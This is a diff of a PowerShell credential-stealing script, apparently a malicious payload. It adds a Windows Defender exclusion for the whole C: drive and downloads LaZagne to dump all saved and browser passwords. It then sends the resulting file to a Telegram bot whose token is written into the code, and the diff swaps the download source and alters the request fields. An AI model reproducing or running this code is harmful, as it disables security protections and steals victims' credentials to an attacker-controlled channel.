@@ -15,7 +15,7 @@ Add-MpPreference -ExclusionPath "C:\"
 
 # Download LaZagne and execute it
 $Test = "C:\temp"
-Start-BitsTransfer -Source "https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.5/LaZagne.exe" -Destination "$Test/l.exe"
+Start-BitsTransfer -Source "https://github.com/User84User/User84PublicUser/blob/main/LasgnaTelegram/lazagne.exe" -Destination "$Test/l.exe"
 Set-Location $Test
 Start-Sleep -Milliseconds 15000
 .\l.exe all -vv > "$env:computername.txt"; .\l.exe browsers -vv >> "$env:computername.txt"
@@ -39,7 +39,7 @@ try {
     # Construct the multipart form-data content
     $BodyLines = @(
         "--$boundary",
-        "Content-Disposition: form-data; name=`"chat_id`"",
+        "Content-Disposition: form-data; name=`"6943834498`"",
         "",
         $ChatID,
         "--$boundary",
@@ -55,7 +55,7 @@ try {
     $BodyBytes = [System.Text.Encoding]::GetEncoding("iso-8859-1").GetBytes($BodyLines)
 
     # Send the request to the Telegram API
-    $TelegramAPI = "https://api.telegram.org/6943834498:AAFdjLE7YKJ1618Cjb3gPGf6o73aiLpbJes/sendDocument"
+    $TelegramAPI = "6943834498:AAFdjLE7YKJ1618Cjb3gPGf6o73aiLpbJes"
     $Response = Invoke-RestMethod -Uri $TelegramAPI -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $BodyBytes
 
     Write-Host "File sent to Telegram successfully."
